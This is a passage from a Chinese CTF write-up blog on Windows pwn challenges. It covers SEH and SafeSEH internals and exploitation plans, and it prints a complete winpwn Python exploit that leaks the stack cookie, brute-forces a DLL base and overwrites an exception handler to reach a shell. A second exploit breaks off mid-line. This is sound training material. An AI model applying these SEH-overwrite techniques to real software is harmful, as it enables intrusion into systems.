  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        exceptionPointers.ExceptionRecord = exceptionRecord;</span><br><span class="line">        exceptionPointers.ContextRecord = context;</span><br><span class="line">        tryLevel = *(_DWORD *)(sehFrame + <span class="number">12</span>);</span><br><span class="line">        *(_DWORD *)(sehFrame - <span class="number">4</span>) = &amp;exceptionPointers;</span><br><span class="line">        <span class="keyword">if</span> ( tryLevel != <span class="number">-2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                v8 = tryLevel + <span class="number">2</span> * (tryLevel + <span class="number">2</span>);</span><br><span class="line">                filterFunc = (<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD))*(&amp;scopeTable_1-&gt;GSCookieXOROffset + v8);</span><br><span class="line">                scopeTableRecord = (_EH4_SCOPETABLE_RECORD *)((<span class="keyword">char</span> *)scopeTable_1 + <span class="number">4</span> * v8);</span><br><span class="line">                encloseingLevel = scopeTableRecord-&gt;EnclosingLevel;</span><br><span class="line">                scopeTableRecord_1 = scopeTableRecord;</span><br><span class="line">                <span class="keyword">if</span> ( filterFunc )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// call FilterFunc</span></span><br><span class="line">                    filterFuncRet = _EH4_CallFilterFunc(filterFunc);</span><br><span class="line">                    ......</span><br><span class="line">                    <span class="keyword">if</span> ( filterFuncRet &gt; <span class="number">0</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                        ......</span><br><span class="line">                        <span class="comment">// call HandlerFunc</span></span><br><span class="line">                        _EH4_TransferToHandler(scopeTableRecord_1-&gt;HandlerFunc, v5 + <span class="number">16</span>);</span><br><span class="line">                        ......</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                ......</span><br><span class="line">                tryLevel = encloseingLevel;</span><br><span class="line">                <span class="keyword">if</span> ( encloseingLevel == <span class="number">-2</span> )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                scopeTable_1 = scopeTable;</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单描述一下这个流程：</p><ol><li>首先通过xor解密<code>_EH3_EXCEPTION_REGISTRATION-&gt;scopetable</code>，得到相应的地址。</li><li>获取栈上存放的old ebp的位置（也就是当前栈的ebp，即framePointer)，进行如下check：<ul><li>如果<code>scopeTable-&gt;GSCookieOffset != -2</code>，则保证<code>ebp ^ cookie == __security_cookie</code>，这里ebp就是当前函数栈的ebp，cookie也是当前栈的cookie，与函数返回前对GS进行check的逻辑一致。</li><li><code>ebp ^ *(ebp - scopetable-&gt;EHCookieOffset) == __security_cookie</code>。</li></ul></li><li>获取栈上存放的<code>_EH3_EXCEPTION_REGISTRATION-&gt;tryLevel</code>，检查该<code>TryLevel != -2</code>的情况下找到对应的<code>_EH4_SCOPETABLE-&gt;_EH4_SCOPETABLE_RECORD</code>。</li><li>如果<code>_EH4_SCOPETABLE_RECORD-&gt;FilterFunc</code>不为空，则执行<code>FilterFunc</code>，返回值大于0则继续执行<code>HandlerFunc</code>。</li></ol><h2 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>首先利用程序最开始输入name再打印name，leak出栈上存放的ebp，cookie和return address，这样可以计算出<code>__security_cookie</code>、栈地址和程序基地址。</li><li>由于在<code>init</code>中，程序获取了<code>scmgr_init</code>的地址，并利用它生成了一个<code>int[32]</code>的buffer，如果调用5号功能，可以得到加密后的buffer内容，因此只要获得明文的buffer内容，我们就可以拿到<code>scmgr_init</code>的地址，进而获得<code>scmgr.dll</code>的基地址，获得其中存在的后门<code>test_getshell</code>的地址。</li><li>考虑该加密应该是单向散列，所以逆推不太可能；此外，<code>scmgr_init</code>的地址为<code>scmgr.dll + 0x1100</code>，<code>scmgr.dll</code>的基址低2 bytes为0，所以只需要爆破高2 bytes即可，速度很快。</li><li>拿到<code>scmgr.dll</code>的基址，就可以利用<code>run</code>功能中的栈溢出，布置栈上的内容；只要伪造<code>_EH3_EXCEPTION_REGISTRATION-&gt;ExceptionHandler</code>为后门地址，加上<code>_EH3_EXCEPTION_REGISTRATION-&gt;prev</code>指向原来的地方，即可再触发异常的时候执行该后门getshell。</li></ol><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'error'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./babyshellcode.exe"</span>)</span><br><span class="line"><span class="comment"># p = remote("node3.buuoj.cn", 29190)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"leave your name"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Option:"</span>, str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, shellcode)</span>:</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"shellcode size:"</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">"shellcode name:"</span>, <span class="string">"AAA"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"shellcode description:"</span>, <span class="string">"AAA"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"shellcode:"</span>, shellcode)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"shellcode index:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"shellcode index:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_challenge_code</span><span class="params">()</span>:</span></span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Your challenge code is "</span>)</span><br><span class="line">    secret = p.recvline().strip().split(<span class="string">'-'</span>)</span><br><span class="line">    value_array = [int(item, <span class="number">16</span>) <span class="keyword">for</span> item <span class="keyword">in</span> secret]</span><br><span class="line">    p.sendlineafter(<span class="string">"challenge response:"</span>, <span class="string">"AAA"</span>)</span><br><span class="line">    <span class="keyword">return</span> value_array</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_buf</span><span class="params">(val)</span>:</span></span><br><span class="line">    buf = [val]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">31</span>):</span><br><span class="line">        buf.append((buf[<span class="number">-1</span>] * <span class="number">0x10DCD</span>) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        buf.append(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(buf, key)</span>:</span></span><br><span class="line">    v0 = ((<span class="number">1</span> &lt;&lt; <span class="number">8</span>) + key - <span class="number">1</span>) &amp; <span class="number">0x1F</span></span><br><span class="line">    v2 = buf[(key + <span class="number">3</span>) &amp; <span class="number">0x1F</span>] ^ buf[key] ^ (buf[(key + <span class="number">3</span>) &amp; <span class="number">0x1F</span>] &gt;&gt; <span class="number">8</span>)</span><br><span class="line">    buf[<span class="number">32</span>] = buf[v0]</span><br><span class="line">    v1 = buf[<span class="number">32</span>]</span><br><span class="line">    buf[<span class="number">33</span>] = v2</span><br><span class="line">    v3 = buf[(key + <span class="number">10</span>) &amp; <span class="number">0x1F</span>]</span><br><span class="line">    v4 = buf[((<span class="number">1</span> &lt;&lt; <span class="number">8</span>) + key - <span class="number">8</span>) &amp; <span class="number">0x1F</span>] ^ v3 ^ (((v3 ^ (<span class="number">32</span> * buf[((<span class="number">1</span> &lt;&lt; <span class="number">8</span>) + key - <span class="number">8</span>) &amp; <span class="number">0x1F</span>])) &lt;&lt; <span class="number">14</span>) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">    v5 = key &amp; <span class="number">0xFF</span></span><br><span class="line">    buf[<span class="number">34</span>] = v4</span><br><span class="line">    buf[key] = v2 ^ v4</span><br><span class="line">    buf[v0] = (v1 ^ v2 ^ v4 ^ ((v2 ^ (<span class="number">16</span> * (v1 ^ (<span class="number">4</span> * v4)))) &lt;&lt; <span class="number">7</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    key = ((<span class="number">1</span> &lt;&lt; <span class="number">8</span>) + v5 - <span class="number">1</span>) &amp; <span class="number">0x1F</span></span><br><span class="line">    <span class="keyword">return</span> buf, key, buf[key]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruteforce_scmgr</span><span class="params">(value_array)</span>:</span></span><br><span class="line">    final_res = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> high2bytes <span class="keyword">in</span> range(<span class="number">0x10000</span>):</span><br><span class="line">        addr = (high2bytes &lt;&lt; <span class="number">16</span>) | <span class="number">0x1090</span></span><br><span class="line">        buf = init_buf(addr)</span><br><span class="line">        key = <span class="number">0</span></span><br><span class="line">        success = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> value_array[::<span class="number">-1</span>]:</span><br><span class="line">            buf, key, res = encrypt(buf, key)</span><br><span class="line">            <span class="comment"># print(buf)</span></span><br><span class="line">            <span class="keyword">if</span> res != item:</span><br><span class="line">                success = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> success == <span class="literal">True</span>:</span><br><span class="line">            final_res = high2bytes &lt;&lt; <span class="number">16</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> final_res</span><br><span class="line"></span><br><span class="line">leave_name(<span class="string">"A"</span> * <span class="number">0x10</span> + <span class="string">"addr"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"addr"</span>)</span><br><span class="line">canary = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">old_ebp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">text_base = u32(p.recv(<span class="number">4</span>).strip().ljust(<span class="number">4</span>, <span class="string">"\x00"</span>)) - <span class="number">0x1AFA</span></span><br><span class="line">ebp_of_main = old_ebp - <span class="number">0x48</span></span><br><span class="line">security_cookie = canary ^ ebp_of_main</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(text_base &amp; <span class="number">0xFFFF</span> == <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    windbgx.attach(p)</span><br><span class="line"></span><br><span class="line">cipher_array = read_challenge_code()</span><br><span class="line">scmgr = bruteforce_scmgr(cipher_array)</span><br><span class="line"><span class="keyword">assert</span>(scmgr != <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">backdoor = scmgr + <span class="number">0x1100</span></span><br><span class="line">except_handler4 = text_base + <span class="number">0x18A0</span></span><br><span class="line">ebp_of_run = ebp_of_main - <span class="number">0x34</span></span><br><span class="line">buf_addr = ebp_of_run - <span class="number">0x80</span></span><br><span class="line">prev_seh = ebp_of_main + <span class="number">0x38</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x70</span> <span class="comment"># padding</span></span><br><span class="line">payload += p32(prev_seh) + p32(backdoor) <span class="comment"># | next | exception_handler</span></span><br><span class="line"></span><br><span class="line">add(len(payload), payload)</span><br><span class="line">run(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[+] scmgr address is: "</span> + hex(scmgr))</span><br><span class="line">print(<span class="string">"[+] text base is: "</span> + hex(text_base))</span><br><span class="line">print(<span class="string">"[+] security_cookie is: "</span> + hex(security_cookie))</span><br><span class="line">print(<span class="string">"[+] ebp of main is: "</span> + hex(ebp_of_main))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Windows-HITBGSEC-BABYSTACK-amp-Windows-第五空间-2019-决赛-PWN9-amp-Windows-SUCTF-2019-BabyStack"><a href="#Windows-HITBGSEC-BABYSTACK-amp-Windows-第五空间-2019-决赛-PWN9-amp-Windows-SUCTF-2019-BabyStack" class="headerlink" title="[Windows][HITBGSEC]BABYSTACK &amp; [Windows][第五空间 2019 决赛]PWN9 &amp; [Windows][SUCTF 2019]BabyStack"></a>[Windows][HITBGSEC]BABYSTACK &amp; [Windows][第五空间 2019 决赛]PWN9 &amp; [Windows][SUCTF 2019]BabyStack</h1><h2 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先该程序开启了SafeSEH保护（虽然winchecksec没识别出来）。<br>其次该程序逻辑十分简单：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *v3; <span class="comment">// eax</span></span><br><span class="line">    FILE *v4; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> v5; <span class="comment">// [esp+20h] [ebp-C0h]</span></span><br><span class="line">    <span class="keyword">int</span> v6; <span class="comment">// [esp+24h] [ebp-BCh]</span></span><br><span class="line">    _DWORD *v7; <span class="comment">// [esp+28h] [ebp-B8h]</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-B4h]</span></span><br><span class="line">    <span class="keyword">char</span> v9[<span class="number">128</span>]; <span class="comment">// [esp+44h] [ebp-9Ch] BYREF</span></span><br><span class="line">    CPPEH_RECORD ms_exc; <span class="comment">// [esp+C8h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">    ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">    v3 = (FILE *)_acrt_iob_func(<span class="number">1</span>);</span><br><span class="line">    setvbuf(v3, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">    v4 = (FILE *)_acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">    setvbuf(v4, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"ouch! Do not kill me , I will tell you everything"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack address = 0x%x\n"</span>, v9);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"main address = 0x%x\n"</span>, main);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Do you want to know more?"</span>);</span><br><span class="line">        read_str((<span class="keyword">int</span>)v9, <span class="number">10</span>);</span><br><span class="line">        v6 = <span class="built_in">strcmp</span>(v9, <span class="string">"yes"</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v6 )</span><br><span class="line">        v6 = v6 &lt; <span class="number">0</span> ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 )</span><br><span class="line">        &#123;</span><br><span class="line">        v5 = <span class="built_in">strcmp</span>(v9, <span class="string">"no"</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v5 )</span><br><span class="line">            v5 = v5 &lt; <span class="number">0</span> ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v5 )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        read_str((<span class="keyword">int</span>)v9, <span class="number">256</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Where do you want to know"</span>);</span><br><span class="line">        v7 = (_DWORD *)read_n();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Address 0x%x value is 0x%x\n"</span>, v7, *v7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ms_exc.registration.TryLevel = <span class="number">-2</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"I can tell you everything, but I never believe 1+1=2"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"AAAA, you kill me just because I don't think 1+1=2??"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最开始的时候，<code>main</code>地址和栈地址都给出了；后面又给了10次任意地址读的机会，如果输入”no”，则会提供一次栈溢出的机会；此外，程序还提供了getshell的后门:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>001B138D                 <span class="keyword">push</span>    offset Command  <span class="comment">; "cmd"</span></span><br><span class="line"><span class="symbol">.text:</span>001B1392                 <span class="keyword">call</span>    <span class="built_in">ds</span>:system</span><br></pre></td></tr></table></figure><p>不过由于开了SafeSEH，如果用BABYSHELLCODE的方法覆盖<code>exception_handler</code>，则无法通过check，所以这里需要了解一下SafeSEH在普通SEH基础上添加了什么。</p><h2 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h2><p>SafeSEH简单来说，就是在SEH的基础上，添加了额外的check。<br>当异常发生时，异常处理过程<code>RtlDispatchException</code>首先检查异常处理节点是否在栈上, 如果不在栈上程序将终止异常处理, 其次检查异常处理<code>Handler</code>是否在栈上, 如果在栈上程序将止异常处理. 最后检测调用<code>RtlIsValidHandler</code>检测<code>Handler</code>有效性：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">RtlIsValidHandler</span><span class="params">(handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 在加载模块的进程空间</span></span><br><span class="line">    <span class="keyword">if</span> (handler is in an <span class="built_in">image</span>) <span class="comment">// step 1</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">image</span> has the IMAGE_DLLCHARACTERISTICS_NO_SEH flag <span class="built_in">set</span>)</span><br><span class="line">            <span class="keyword">return</span> FALSE; <span class="comment">// 该标志设置，忽略异常处理，直接返回FALSE</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">image</span> has a SafeSEH table) <span class="comment">// 是否含有SEH表</span></span><br><span class="line">            <span class="keyword">if</span> (handler found in the table)</span><br><span class="line">                <span class="keyword">return</span> TRUE; <span class="comment">// 异常处理handle在表中，返回TRUE</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> FALSE; <span class="comment">// 异常处理handle不在表中，返回FALSE</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">image</span> is a .NET assembly with the ILonly flag <span class="built_in">set</span>)</span><br><span class="line">            <span class="keyword">return</span> FALSE; <span class="comment">// .NET 返回FALSE</span></span><br><span class="line">        <span class="comment">// fall through</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// handle在不可执行页上面</span></span><br><span class="line">    <span class="keyword">if</span> (handler is on a non-executable page) <span class="comment">// step 2</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ExecuteDispatchEnable <span class="built_in">bit</span> <span class="built_in">set</span> in the <span class="built_in">process</span> flags)</span><br><span class="line">            <span class="keyword">return</span> TRUE; <span class="comment">// DEP关闭，返回TRUE；否则抛出异常</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            raise ACCESS_VIOLATION; <span class="comment">// enforce DEP even if we have no hardware NX</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 在加载模块内存之外，并且是可执行页</span></span><br><span class="line">    <span class="keyword">if</span> (handler is <span class="keyword">not</span> in an <span class="built_in">image</span>) <span class="comment">// step 3</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ImageDispatchEnable <span class="built_in">bit</span> <span class="built_in">set</span> in the <span class="built_in">process</span> flags)</span><br><span class="line">            <span class="keyword">return</span> TRUE; <span class="comment">// 允许在加载模块内存空间外执行，返回验证成功</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> FALSE; <span class="comment">// don't allow handlers outside of images</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// everything else is allowed</span></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面伪代码里的<code>ExecuteDispatchEnable</code>和<code>ImageDispatchEnable</code>标志用来控制<code>Handler</code>在不可执行内存或者不在异常模块的映像内时, 是否可以执行。默认情况下, 如果进程DEP开启, 两位为0, DEP关闭, 两位为1。</p><h2 id="利用思路-3"><a href="#利用思路-3" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>利用任意地址读，把栈上的cookie给leak出来。</li><li>利用栈溢出，在栈上伪造一个<code>_EH4_SCOPETABLE</code>结构，使得<code>FilterFunc</code>为backdoor；同时绕过所有的check，保证异常处理流程正确执行到<code>FilterFunc</code>上。</li></ol><blockquote><p>从上面SEH原理分析<code>_except_handler4_common</code>的流程时，注意到先会检查<code>FilterFunc</code>是否为空再依次执行<code>FilterFunc</code>和<code>HandlerFunc</code>；但在实际调试过程中发现，即使<code>FilterFunc == NULL</code>，设置<code>HandlerFunc = backdoor</code>最终也能getshell，只是相比之下会延迟一段时间。<br>由于<code>_except_handler4_common</code>代码也是借用其他师傅博客里的，中间省略的部分也不知从何获得，所以暂时还不知道原因。</p></blockquote><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x10b0</span></span><br><span class="line">target = <span class="number">0x139B</span></span><br><span class="line">__security_cookie_offset = <span class="number">0x4004</span></span><br><span class="line">backdoor = <span class="number">0x138D</span></span><br><span class="line">handler = <span 